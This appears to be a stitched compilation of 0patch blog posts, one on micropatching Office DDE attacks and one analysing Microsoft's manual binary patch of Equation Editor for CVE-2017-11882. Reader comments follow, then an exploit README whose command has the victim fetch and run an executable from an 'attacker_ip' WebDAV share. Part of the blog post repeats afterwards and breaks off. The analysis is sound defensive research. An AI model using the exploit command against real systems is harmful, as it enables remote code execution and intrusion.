As real-world exploits became more prevalent, Microsoft issued a [security advisory](https://technet.microsoft.com/en-us/library/security/4053440.aspx) explaining how to disable auto-updating of DDE fields (echoing prior [guidance from the community](https://gist.github.com/wdormann/732bb88d9b5dd5a66c9f1e1498f31a1b)). The subsequent release of Windows 10 Fall Creators Update also brought the Attack Surface Reduction feature, which [blocked some DDE-borne attacks](https://blog.0patch.com/2017/11/office-dde-exploits-and-attack-surface.html) (although not via Outlook).

Three weeks after we have released our micropatch, Microsoft updated various Office components (including wwlib.dll which we micropatched) for unrelated reasons, prompting us to re-issue micropatches for the modified modules.

> Service Update: Recent Patch Tuesday modified MS Office's wwlib.dll, prompting us to port our DDE/DDEAUTO micropatches to new versions. These will be downloaded and applied automatically without disturbing your work. <https://t.co/rZsObtaQIh>
> — 0patch (@0patch) [November 17, 2017](https://twitter.com/0patch/status/931622477737930752?ref_src=twsrc%5Etfw)

Porting micropatches to new product versions (or old versions, for that matter) is a standard procedure with us, so it took us just a few hours from obtaining Microsoft's updates and having all Office versions covered with the new micropatches. Our users didn't notice anything, and that's how we believe vulnerability patching should work in this century.

**Enter Vendor's Official Fix**

Yesterday, 42 days after we have initially released our DDE micropatch, Microsoft issued an update for Word that provides registry-based configuration of DDE behavior. Users are now able to select whether:

1. DDE is entirely disabled (this is the default);
2. DDE works [exactly as specified by Microsoft's documentation](https://msdn.microsoft.com/en-us/library/ff533431%28v%3Doffice.12%29.aspx), i.e., it communicates with already launched applications, but doesn't launch applications itself (this is the behavior implemented by our micropatch);
3. DDE works as before, allowing DDE-borne attacks.

So what happens on computers with 0patch Agent when this official Word update is installed? Elegantly, our micropatches stop being applied by design when executables they're patching are modified, because that changes their cryptographic hash. Microsoft's update modifies the target module for our DDE micropatches (wwlib.dll), resulting in (1) our micropatches becoming obsolete and (2) DDE getting disabled due to the default setting of the above-mentioned configuration.

We will not port our micropatch to this new Word update as there is no need for that: Office users who apply the latest Word update and want to keep using DDE without the fear of launching malicious executables can create a DWORD registry value AllowDDE under HKEY\_CURRENT\_USER\Software\Microsoft\Office\version\Word\Security and set it to 1 as described in [Microsoft's advisory](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170021).

However, users who haven't applied the Word update yet or can't apply it for any reason, will remain protected by our micropatches. If you happen to be in such situation and don't have 0patch Agent yet, simply [download](https://0patch.com/download.htm), install and register it. It's free.

How does this Microsoft's DDE fix compare to our DDE micropatch?

* **Behavior**: The behavior of Microsoft's fixed code is almost identical to our micropatch for AllowDDE value 1. (The former is actually a bit better as it doesn't even ask your permission to launch the application.) For AllowDDE value 0, DDE is completely disabled - our micropatch doesn't provide this option and we actually don't see any security value in it other than reducing the amount of code accessible by malicious documents. Then again, perhaps Microsoft is aware of some other DDE-related attack that this option blocks, or they're simply trying to steer users away from using DDE;
* **Timing**: Our micropatch for the DDE issue was available 42 days before Microsoft's official fix;
* **Ease of installation**: Installing Microsoft's update requires a computer restart (although the relevant changes are actually applied without that), while a micropatch is installed and applied without any disruption, even while the user is editing a document in Word;
* **Ease of use**: Microsoft's DDE configuration is done via registry, while our patch can be turned on and off either via registry or via 0patch Console's graphical user interface. Also, any user can configure DDE for themselves while only administrator can turn our micropatch on or off. (In other words, 0patch doesn't allow users to make themselves vulnerable again because they liked the way things worked before.)
* **Portability**: It would be extremely expensive for Microsoft (not to mention undesirable in the business sense) to port this new DDE configurability to older versions (builds) of Office, especially the end-of-life versions. In contrast, it's trivial for us to port our micropatches to any previous version and build as needed by our users.

**Conclusion**

In conclusion, this 42-day exercise nicely demonstrated the value of 0patch and micropatching. We proved that a micropatch can be quickly developed for numerous product versions and distributed to all users without disturbance. We showed that when a micropatched product is modified by its vendor, we can quickly re-issue micropatches for it (by the way, there's lots of room for further improvement there). And finally, as this DDE issue was officially patched by the vendor and this fix applied on users' computers, our micropatches for it have reached their intended end of life. For those, however, who for any reason can't apply the Word update or must delay its application due to comprehensive testing requirements, our micropatch remains there for you, for free and for however long you need it. This is exactly how we intend to [bridge the security update gap](https://blog.0patch.com/2016/01/bridging-security-update-gap-with-0patch.html).

Keep your feedback coming! Thank you!

### Did Microsoft Just Manually Patch Their Equation Editor Executable? Why Yes, Yes They Did. (CVE-2017-11882)

**And They Did an Absolutely Stellar Job**

by Mitja Kolsek, the 0patch Team

[Update 11/21/2017]  Today Embedi published [their proof-of-concept exploit](https://github.com/embedi/CVE-2017-11882), which allowed us to see where exactly Microsoft's manual patch blocks it. Contrary to this article's original claim that CVE-2017-11882 was patched in function 4164FA while six other buffer overflow checks we found were for some other attack vectors, it is actually one of those six checks that blocks Embedi's exploit. This article has been slightly corrected to reflect that. In addition, we were now able to create a micropatch for Equation Editor that also blocks all exploits targeting the vulnerability found by Embedi. All Internet-connected computers with a registered 0patch Agent running have already received this micropatch and have it automatically applied whenever Equation Editor is launched. [End update 11/21/2017]

**A Pretty Old Executable**

The recent Patch Tuesday brought, among other things, a new version of "old" Equation Editor, which introduced a [fix for a buffer overflow issue](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882) reported by [Embedi](https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about).

The "old" Equation Editor is an *ancient* component of Microsoft Office (Office now uses an integrated Equation Editor), which is confirmed by looking at the properties of the unpatched EQNEDT32.EXE:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8IEeFXdeDj9mNI75V11tpfyB2wAA0lkkdhh3Gwx3lE_tU7SRLB4tiCfPRAcjLeXftcue_6JyFhzhx2TLjvqdZ2wY7a77Rqb-kXquw2wpc57_luDHGxd3oCcVh2ptiMJwhc6VsJMsbxyw2/s640/Equation_editor_properties.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8IEeFXdeDj9mNI75V11tpfyB2wAA0lkkdhh3Gwx3lE_tU7SRLB4tiCfPRAcjLeXftcue_6JyFhzhx2TLjvqdZ2wY7a77Rqb-kXquw2wpc57_luDHGxd3oCcVh2ptiMJwhc6VsJMsbxyw2/s1600/Equation_editor_properties.png)

We can see that *File version* is 2000.11.9.0 (implying being built in 2000), while *Date modified* is in 2003, which matches the time of its signature (signing modifies the file as the signature is attached to it.) Furthermore, the [*TimeDateStamp* in its PE header](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680547%28v%3Dvs.85%29.aspx) (3A0ACEBF),
which the compiler writes into the executable module when building it,
indicates that the file was built on November 9, 2000 - exactly matching
the date in the above version number.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiT-yzvlWZUx42-mAhguywx14XNLDV-UW7wW5AVPEbjyvRed4Hsx6mMeuVcMHDMknQGX7WDHU_RWUDIkm8cq2tCsJKYBv_hOKJqphYLIkd6C6wDnYhCdZb6Utw_ZHKSYWvtCyE1-Ptva3fm/s640/Equation_editor_timestamp.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiT-yzvlWZUx42-mAhguywx14XNLDV-UW7wW5AVPEbjyvRed4Hsx6mMeuVcMHDMknQGX7WDHU_RWUDIkm8cq2tCsJKYBv_hOKJqphYLIkd6C6wDnYhCdZb6Utw_ZHKSYWvtCyE1-Ptva3fm/s1600/Equation_editor_timestamp.png)

We're therefore safe to claim that the vulnerable EQNEDT32.EXE has been with us since 2000. That's 17 years, which is a pretty respectable life span for software!

So now a vulnerability was reported in this executable and Microsoft spawned their fixing procedure: they reproduced the issue using Embedi's proof-of-concept, confirmed it, took the source code, fixed the issue in the source code, re-built EQNEDT32.EXE, and distributed the fixed version to Office users, who now see version 2017.8.14.0 under its properties.

At least that's how it *would* work for most other vulnerabilities. But something was different here. For some reason, Microsoft didn't fix this issue in the source code - but rather by manually patching the binary executable.

**Manually Patching an EXE?**

Really, quite literally, some pretty skilled Microsoft employee or contractor reverse engineered our friend EQNEDT32.EXE, located the flawed code, and corrected it by manually overwriting existing instructions with better ones (making sure to only use the space previously occupied by original instructions).

How do we know that? Well, have you ever met a C/C++ compiler that would put all functions in a 500+ KB executable on **exactly the same address in the module** after rebuilding a modified source code, especially when these modifications changed the amount of code in several functions?

To clarify, let's look at BinDiff results between the fixed (2017.8.14.0, "primary") and vulnerable version (2000.11.9.0, "secondary") of EQNEDT32.EXE:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnUHMd534sZyKvY8L5kPC7UfzjLazmo6ywEspdFSJwQHIlvD7R362ECK-OlBECc9OruM0F8UMM1Ov3FEUEONfgx8wG5gWfHOGgJ4ITBLhOcdW6oa3PnmQjKKR9kVRYWwoOFhUS9f6NrXx4/s640/Equation_Editor_diff_matched_functions.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnUHMd534sZyKvY8L5kPC7UfzjLazmo6ywEspdFSJwQHIlvD7R362ECK-OlBECc9OruM0F8UMM1Ov3FEUEONfgx8wG5gWfHOGgJ4ITBLhOcdW6oa3PnmQjKKR9kVRYWwoOFhUS9f6NrXx4/s1600/Equation_Editor_diff_matched_functions.PNG)

If you're diffing binaries a lot, you'll notice something highly peculiar: All *EA primary* values are identical to *EA secondary* values of matched functions. Even the matched but obviously different functions listed at the bottom are at the same address in both EQNEDT32.EXE versions.

As we already [noted on Twitter](https://twitter.com/0patch/status/930803478930345984), Microsoft modified five functions in EQNEDT32.EXE, namely the bottom-most five functions listed on the above image. Let's look at the most-modified one first, the one at address 4164FA. The patched version is on the left, the vulnerable one on the right.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0DFJCW0nBXQQbl5RVesEv8yM5C4y6vqJLDXboQr7_SinByDrH8i7A0dq-uhsrjEHUxmnaRgD7ar1gqcUZskbpbnkOHLADbvUWK6fiHtQ4Z3b3Y9_AFWejkevLIK1_ShFFk4Xru5BHv4rb/s640/Equation_Editor_diff_patched_function.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0DFJCW0nBXQQbl5RVesEv8yM5C4y6vqJLDXboQr7_SinByDrH8i7A0dq-uhsrjEHUxmnaRgD7ar1gqcUZskbpbnkOHLADbvUWK6fiHtQ4Z3b3Y9_AFWejkevLIK1_ShFFk4Xru5BHv4rb/s1600/Equation_Editor_diff_patched_function.PNG)

This function takes a pointer to the destination buffer and copies characters, one by one in a loop, from user-supplied string to this buffer. It is also the very function that Embedi found to be vulnerable in their research; namely, there was no check whether the destination buffer was large enough for the user-supplied string, and a too-long font name provided through the Equation object could cause a buffer overflow.

Microsoft's fix introduced an additional parameter to this function, specifying the destination buffer length. The original logic of the character-copying loop was then modified so that the loop ends not only when the source string end is reached, but also when the destination buffer length is reached - preventing buffer overflow. In addition, the copied string in the destination buffer is zero-terminated after copying, in case the destination buffer length was reached (which would leave the string unterminated).

Let's look at the code in its text form (again, patched function on left, vulnerable on right):

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhbwrISsFajRN3RaxX4Ifogd77w010gSKkHjcEc3aVQio1cmoo1FaZk-17WBJ1tlj3CfuKnGcRhLRfA9XnWdrCXq9Rc0sHrMZp5BFIdWaKZvDHyyuMEeEgMClLRS7R67_SK6J2Z32q9bp7C/s640/Patched_function_code_diff.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhbwrISsFajRN3RaxX4Ifogd77w010gSKkHjcEc3aVQio1cmoo1FaZk-17WBJ1tlj3CfuKnGcRhLRfA9XnWdrCXq9Rc0sHrMZp5BFIdWaKZvDHyyuMEeEgMClLRS7R67_SK6J2Z32q9bp7C/s1600/Patched_function_code_diff.png)
As you can see, whoever patched this function not only added a check for buffer length in it, but also managed to make the function 14 bytes shorter (and padded the resulting gap before the adjacent function with 0xCC bytes for style points :). Impressive.

**Patching The Callers**

Moving on. If the patched function got an additional parameter, all those calling it would have to change as well, right? There are exactly two callers of this function, at addresses 43B418 and 4181FA, and in the patched version they both have a push instruction added before the call to specify the length of their buffers, 0x100 and 0x1F4 respectively.

Now, a push instruction with a 32-bit literal operand takes 5 bytes. In order to add this instruction to these two functions while staying within the tight space of the original code (whose logic must also remain intact), thepatcher did the following:

For function at address 43B418, the patched function temporarily stores some value - which it will need later on - in ebx instead of a local stack-based variable, which releases enough bytes for injecting the push call. (By the way, additional evidence of manual patching is that while the local variable is no longer used, space for it is still made on the stack; otherwise sub esp, 0x10C would turn into sub esp, 0x108.)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEio38llUlygTJ_NsRRaHIHkYqhPZXmmCF3sec3kgiPqTRSqZc21cIHCTf7_o8bkaiSSnrO8AFfjB0e1TbNZSK3PpkGazDI_JmSCZROrAr1IEnr82JMAkUMze8W3luLRzlmCtio_UGx79KMm/s640/Equation_Editor_diff_43B418.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEio38llUlygTJ_NsRRaHIHkYqhPZXmmCF3sec3kgiPqTRSqZc21cIHCTf7_o8bkaiSSnrO8AFfjB0e1TbNZSK3PpkGazDI_JmSCZROrAr1IEnr82JMAkUMze8W3luLRzlmCtio_UGx79KMm/s1600/Equation_Editor_diff_43B418.PNG)

For the other caller, function at address 4181FA, the patched function mysteriously has the push instruction injected without any other modifications to the code that would introduce the needed extra space.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixj_rLisDsJMndmTGOXDoSi4ncN01cOenpN6wYH67Qx3dR5_-PZjDwb6QSNOXRIGQjPyrY_aGnOs8RiGHkzuYEM_Nx4rc8UphiGCN8kq6k8yGB_Aex6JfpCpVjXKueKWC9kWqgKrwLL_Q-/s640/Equation_Editor_diff_4181FA.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixj_rLisDsJMndmTGOXDoSi4ncN01cOenpN6wYH67Qx3dR5_-PZjDwb6QSNOXRIGQjPyrY_aGnOs8RiGHkzuYEM_Nx4rc8UphiGCN8kq6k8yGB_Aex6JfpCpVjXKueKWC9kWqgKrwLL_Q-/s1600/Equation_Editor_diff_4181FA.PNG)

As you can see on the above image, the push instruction is injected at the beginning of the yellow block, and all original instructions in that block are pushed down 5 bytes. But why does this not overwrite 5 bytes of the original code somewhere else? It's as if there were 5 or more unused bytes already in existence just after this block of code that the patcher could safely overwrite.

To solve this mystery, let's look at the code in its text form.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEfprSByDLlfoqDcG4K_JeQ7pEcclD2HwPzP60YC-GuNmOG7g7rGZiw6cm4BqCoeBye_z04njU2LmXb9P7AfOSYEKLnXFMC8L3w-Co3W-Pf-c76Q7RaX7B4G0wNsYhbD1A9tiQKbrnc9kz/s640/4181FA_code_diff.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEfprSByDLlfoqDcG4K_JeQ7pEcclD2HwPzP60YC-GuNmOG7g7rGZiw6cm4BqCoeBye_z04njU2LmXb9P7AfOSYEKLnXFMC8L3w-Co3W-Pf-c76Q7RaX7B4G0wNsYhbD1A9tiQKbrnc9kz/s1600/4181FA_code_diff.PNG)

Surprise, the vulnerable version actually had an extra jmp loc\_418318 instruction at the end of the modified code block. How convenient! This allows the code in this block to be moved down 5 bytes, making space for the push instruction at the top.

Coincidence? Perhaps, but it looks an awful lot like this code block got manually modified before in the past, whereby it got shortened for 5 bytes and its last instruction (jmp loc\_418318) was left there.

**Additional Security Checks**

What we've covered so far was related to Embedi's published research and CVE-2017-11882, but is *not* what blocks Embedi's exploit. The new version of EQNEDT32.EXE has two additional modified functions at addresses 41160F and 4219F0. Let's have a look at them.

In the patched executable, these two functions got a bunch of injected boundary checks for copying to what appear to be 0x20-byte buffers. These checks all look the same: ecx (which is the counter for copying) is compared to 0x21; if it's greater than or equal to that, ecx gets set to 0x20. All these checks are injected right before inlined memcpy operations. Let's look at one of them to see how the patcher made room for the additional instructions.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhe0z6vud-e8X-qN8MdsAuXQ3tdKEVU6NbGAw-0DjAtqoprFTNriJYQEO1CPN3Wpd7RilpN9K_Oq8K_kIB19Nn4YjD6tcAV9DN4sIn4WpU0nizx4DkVVgHmqZWjqTKI5Z9CtlF4t2lm2ijK/s640/Equation_Editor_diff_41160F.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhe0z6vud-e8X-qN8MdsAuXQ3tdKEVU6NbGAw-0DjAtqoprFTNriJYQEO1CPN3Wpd7RilpN9K_Oq8K_kIB19Nn4YjD6tcAV9DN4sIn4WpU0nizx4DkVVgHmqZWjqTKI5Z9CtlF4t2lm2ijK/s1600/Equation_Editor_diff_41160F.PNG)

As shown on the above image, a check is injected before the inlined memcpy code. Note that in 32-bit code, memcpy is typically implemented by first copying blocks of 4 bytes using the movsd (move double word) instruction, while any remaining bytes are then copied using movsb (move byte). This is efficient in terms of performance, but whoever was patching this noticed that some space can be freed by only using movsb, and perhaps sacrificing a nanosecond or two. After doing so, the code remained logically identical but now there was space for injecting the check before it, as well as for zero-terminating the copied string. Again, an impressive and clever hack (and there was still an extra byte to spare - notice the nop?)

There are six such length checks in two modified functions, and just one of them is directly responsible for blocking Embedi's exploit. We believe that Microsoft noticed some additional attack vectors that could also cause a buffer overflow and decided to proactively patch the other five memcpys and the patched function we covered earlier.

**Final Touches**

After patching the vulnerable code and effectively manually building a new version of Equation Editor, the patcher also corrected the version number of EQNEDT32.EXE to 2017.8.14.0, and the *TimeDateStamp* in the PE header to August 14, 2017 (hex value 5991FA38) - which is just 10 days after Microsoft acknowledged receipt of Embedi's report. (Note however that due to the manual nature of setting these values it's possible that code has been modified after that date.)

[Update 11/20/2017] Another thing Microsoft also patched in EQNEDT32.EXE was the "ASLR bit", i.e., they set the IMAGE\_DLLCHARACTERISTICS\_DYNAMIC\_BASE flag in the [PE optional header structure](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680339%28v%3Dvs.85%29.aspx):

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPg_J8QSSkyHHtChYKp7iqQurszpBIyb-BoKW6_XGIaYw6144v2mT6BSJUvgEWsM3ZhBSIDeZVvsAhSSPLOhXU686BgxoMdx8dhCnTs0VDJhGjwqxHb1jG9zjg_kEdqWqtHjYMHiqYW6DE/s640/ASLR.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPg_J8QSSkyHHtChYKp7iqQurszpBIyb-BoKW6_XGIaYw6144v2mT6BSJUvgEWsM3ZhBSIDeZVvsAhSSPLOhXU686BgxoMdx8dhCnTs0VDJhGjwqxHb1jG9zjg_kEdqWqtHjYMHiqYW6DE/s1600/ASLR.png)

This is good. Enabling ASLR on EQNEDT32.EXE will make it harder to exploit any remaining memory corruption vulnerabilities. For instance, Embedi's exploit would not work with ASLR because it relied on the fact that the call to WinExec would always be present at the same memory address; this allowed them to simply put that address on stack and wait for the ret to do all the work.

Interestingly, Microsoft decided not to also set the IMAGE\_DLLCHARACTERISTICS\_NX\_COMPAT ("DEP") flag, which would prevent code execution from data pages (e.g., from stack). They surely had good reasons, but should any additional vulnerabilities be found and exploited in EQNEDT32.EXE, the exploit will likely include execution of data on stack or heap. [End update 11/20/2017]

**Conclusion**

Maintaining a software product in its binary form instead of rebuilding it from modified source code is hard. We can only speculate as to why Microsoft used the binary patching approach, but being binary patchers ourselves we think they did a stellar job.

This old Equation Editor is now under the spotlight, and many researchers are likely to start fuzzing it for additional vulnerabilities. If any are found, we'll probably see additional rounds of manual binary patches in EQNEDT32.EXE. While Office has had a new Equation Editor integrated since at least version 2007, Microsoft can't simply remove EQNEDT32.EXE (the old Equation Editor) from Office as there are probably tons of old documents out there containing equations in this old format, which would then become un-editable.

Now how would we micropatch CVE-2017-11882 with 0patch? It would actually be much easier: we wouldn't have to shrink existing code to make room for the injected one, because 0patch makes sure that we get all the space we need. So we wouldn't have to come up with clever hacks like de-optimizing memcpy or finding an alternative place to temporarily store a value for later use. This freedom and flexibility makes developing an in-memory micropatch much easier and quicker than in-file patching, and we believe software vendors like Microsoft could benefit greatly from using in-memory micropatching for fixing critical vulnerabilities.

Oh by the way, Microsoft also updated Office's wwlib.dll this Patch Tuesday, prompting us to port our [DDE / DDEAUTO patches](https://blog.0patch.com/2017/10/0patching-office-dde-ddeauto.html) to these new versions. 0patch Agent running on your computer will automatically download and apply these new patches without interrupting you. If you don't have 0patch Agent installed yet, we have good news for you: IT'S FREE! Just [download](http://0patch.com/download.htm), install and register, and you're all set.

Cheers!

     This is the most obvious and probably the real reason. 17 year old source code got lost... God knows, maybe they were not even using a source code version control system back then.

     Either this or they know how long their builds take. Maybe a very long time. I think also other files would be touched with a re-compile from source. Throw OEM and alternate language versions in. If more than 100 versions then it's clear why. If it's just 5 or 6 versions maybe different. Surely this saves a recompile on somewhere between 24 and 75 builds of the same software. Saves on bandwidth too, maybe they want to get this out quick and deep = small file gets in quicker.

   Having the patched version on the left has lately become a habit to us (often diffing the latest version with multiple older versions so primary stays open). But wondering, is there some consensus on this in the community?

     I haven't heard of any consensus (or seen the question asked before). I typically do Old Left - New Right so i can see what was present when I started and what changes I've made.
     When doing a merge I'll put my changes on the left with the new file on the right when comparing so the destination is on the right.

     That said: without looking it up I don't know how I diff current vs past revisions. (Verifying it I do have past on left with current would be on right)

     Although it sounds logical to have the newer versions to the right like in a timeline, it's more "natural?" to have the newer on the left and the older on the right :D Dunno, I got a strange feeling about that :D

     ditto the above, it's like reading left to right, like an x-axis timeline increasing from left to right. Seems a reasonable request.

   The copyright tag in the first screenshot is interesting. Who are "Design Science, Inc."? Perhaps that's why Microsoft doesn't have the source?

   Equation Editor was written bu a third party vendor (Design Science). Most probably MS did not have the source code.

     That's not correct: MathType has been around for a long time: first on the Mac, and then on Windows 2. Microsoft licensed a scaled-down version of MathType, called Equation Editor, for inclusion with some of its products on both Windows and Macintosh.

    Reported a bug to MS in GDI+ Image.Save() about 2 years ago, which is present from XP to Win10. Some encoders do not report an error if write operations fail (e.g. out of disk space) and generate invalid files. MS offered 3 different approaches, how to work around this problem, but refused to accept this being a bug. I got the impression, that they don't want to touch old code. After a lot of arguing (maybe 10 emails) they finally accepted it being a bug. Maybe they are scared that a rebuild with a current tool chain may cause strange side effects. Maybe the old code base contains "dirty tricks", that would cause issues with current tools.

      I'm pretty sure that a company like Microsoft, does not only keep old sources, but also the relevant tool chains, target OSes (to build and test upon). Otherwise things would be pretty futile and indeed dangerous.

      That doesn't mean, of course, that they are reluctant to change old software - every little change could introduce a compatibility issue on the other end.

    Technically, Microsoft could just have a replicable build toolchain. This is a thing in safety critical computing, where you should be able to recreate binaries bit-for-bit; usually this means version controlling the source code together with the entire toolchain.

    MS had source code (or Design Science compiled it for them) at least as far as around 2005, since different build comes with Office 2007 and file is dated 10/04/2005 (also TimeDateStamp in both builds correspond to file modification date). For whatever reason they reverted to older builds since Office 2010 I think.

    Besides recompilation I see no other differences, version numbers are the same, copyright date is the same etc.

    Discovered that while updating manually Equation Editor on various PCs with different Office versions.

    TL&DR; Office 2007 had different version of Equation Editor built in 2005.

    I was an engineer at Microsoft working on compatibility fixes and did a lot of these patches. You are very often better off making a very specific tweak to older codebases rather than doing a full build. Minor changes to compilers, other tools, etc are an issue, but the big one is recreating the full test suite for older apps. Doing a professional job releasing software that could be in use by millions of people is a HUGE endeavor to do properly.

# webdav\_exec CVE-2017-11882

A simple PoC for CVE-2017-11882.
This exploit triggers WebClient service to start and execute remote file from attacker-controlled WebDav server.
The reason why this approach might be handy is a limitation of executed command length.
However with help of WebDav it is possible to launch arbitrary attacker-controlled executable on vulnerable machine.
This script creates simple document with several OLE objects.
These objects exploits CVE-2017-11882, which results in sequential command execution.

The first command which triggers WebClient service start may look like this:

```
cmd.exe /c start \\attacker_ip\ff

```

Attacker controlled binary path should be a UNC network path:

```
\\attacker_ip\ff\1.exe

```

## Usage

```
webdav_exec_CVE-2017-11882.py -u trigger_unc_path -e executable_unc_path -o output_file_name
```

# Sample exploit for CVE-2017-11882 (starting calc.exe as payload)

### Did Microsoft Just Manually Patch Their Equation Editor Executable? Why Yes, Yes They Did. (CVE-2017-11882)

**And They Did an Absolutely Stellar Job**

by Mitja Kolsek, the 0patch Team

[Update 11/21/2017]  Today Embedi published [their proof-of-concept exploit](https://github.com/embedi/CVE-2017-11882), which allowed us to see where exactly Microsoft's manual patch blocks it. Contrary to this article's original claim that CVE-2017-11882 was patched in function 4164FA while six other buffer overflow checks we found were for some other attack vectors, it is actually one of those six checks that blocks Embedi's exploit. This article has been slightly corrected to reflect that. In addition, we were now able to create a micropatch for Equation Editor that also blocks all exploits targeting the vulnerability found by Embedi. All Internet-connected computers with a registered 0patch Agent running have already received this micropatch and have it automatically applied whenever Equation Editor is launched. [End update 11/21/2017]

**A Pretty Old Executable**

The recent Patch Tuesday brought, among other things, a new version of "old" Equation Editor, which introduced a [fix for a buffer overflow issue](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882) reported by [Embedi](https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about).

The "old" Equation Editor is an *ancient* component of Microsoft Office (Office now uses an integrated Equation Editor), which is confirmed by looking at the properties of the unpatched EQNEDT32.EXE:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8IEeFXdeDj9mNI75V11tpfyB2wAA0lkkdhh3Gwx3lE_tU7SRLB4tiCfPRAcjLeXftcue_6JyFhzhx2TLjvqdZ2wY7a77Rqb-kXquw2wpc57_luDHGxd3oCcVh2ptiMJwhc6VsJMsbxyw2/s640/Equation_editor_properties.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8IEeFXdeDj9mNI75V11tpfyB2wAA0lkkdhh3Gwx3lE_tU7SRLB4tiCfPRAcjLeXftcue_6JyFhzhx2TLjvqdZ2wY7a77Rqb-kXquw2wpc57_luDHGxd3oCcVh2ptiMJwhc6VsJMsbxyw2/s1600/Equation_editor_properties.png)

We can see that *File version* is 2000.11.9.0 (implying being built in 2000), while *Date modified* is in 2003, which matches the time of its signature (signing modifies the file as the signature is attached to it.) Furthermore, the [*TimeDateStamp* in its PE header](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680547%28v%3Dvs.85%29.aspx) (3A0ACEBF),
which the compiler writes into the executable module when building it,
indicates that the file was built on November 9, 2000 - exactly matching
the date in the above version number.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiT-yzvlWZUx42-mAhguywx14XNLDV-UW7wW5AVPEbjyvRed4Hsx6mMeuVcMHDMknQGX7WDHU_RWUDIkm8cq2tCsJKYBv_hOKJqphYLIkd6C6wDnYhCdZb6Utw_ZHKSYWvtCyE1-Ptva3fm/s640/Equation_editor_timestamp.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiT-yzvlWZUx42-mAhguywx14XNLDV-UW7wW5AVPEbjyvRed4Hsx6mMeuVcMHDMknQGX7WDHU_RWUDIkm8cq2tCsJKYBv_hOKJqphYLIkd6C6wDnYhCdZb6Utw_ZHKSYWvtCyE1-Ptva3fm/s1600/Equation_editor_timestamp.png)

We're therefore safe to claim that the vulnerable EQNEDT32.EXE has been with us since 2000. That's 17 years, which is a pretty respectable life span for software!

So now a vulnerability was reported in this executable and Microsoft spawned their fixing procedure: they reproduced the issue using Embedi's proof-of-concept, confirmed it, took the source code, fixed the issue in the source code, re-built EQNEDT32.EXE, and distributed the fixed version to Office users, who now see version 2017.8.14.0 under its properties.

At least that's how it *would* work for most other vulnerabilities. But something was different here. For some reason, Microsoft didn't fix this issue in the source code - but rather by manually patching the binary executable.

**Manually Patching an EXE?**

Really, quite literally, some pretty skilled Microsoft employee or contractor reverse engineered our friend EQNEDT32.EXE, located the flawed code, and corrected it by manually overwriting existing instructions with better ones (making sure to only use the space previously occupied by original instructions).

How do we know that? Well, have you ever met a C/C++ compiler that would put all functions in a 500+ KB executable on **exactly the same address in the module** after rebuilding a modified source code, especially when these modifications changed the amount of code in several functions?

To clarify, let's look at BinDiff results between the fixed (2017.8.14.0, "primary") and vulnerable version (2000.11.9.0, "secondary") of EQNEDT32.EXE:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnUHMd534sZyKvY8L5kPC7UfzjLazmo6ywEspdFSJwQHIlvD7R362ECK-OlBECc9OruM0F8UMM1Ov3FEUEONfgx8wG5gWfHOGgJ4ITBLhOcdW6oa3PnmQjKKR9kVRYWwoOFhUS9f6NrXx4/s640/Equation_Editor_diff_matched_functions.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnUHMd534sZyKvY8L5kPC7UfzjLazmo6ywEspdFSJwQHIlvD7R362ECK-OlBECc9OruM0F8UMM1Ov3FEUEONfgx8wG5gWfHOGgJ4ITBLhOcdW6oa3PnmQjKKR9kVRYWwoOFhUS9f6NrXx4/s1600/Equation_Editor_diff_matched_functions.PNG)

If you're diffing binaries a lot, you'll notice something highly peculiar: All *EA primary* values are identical to *EA secondary* values of matched functions. Even the matched but obviously different functions listed at the bottom are at the same address in both EQNEDT32.EXE versions.

As we already [noted on Twitter](https://twitter.com/0patch/status/930803478930345984), Microsoft modified five functions in EQNEDT32.EXE, namely the bottom-most five functions listed on the above image. Let's look at the most-modified one first, the one at address 4164FA. The patched version is on the left, the vulnerable one on the right.

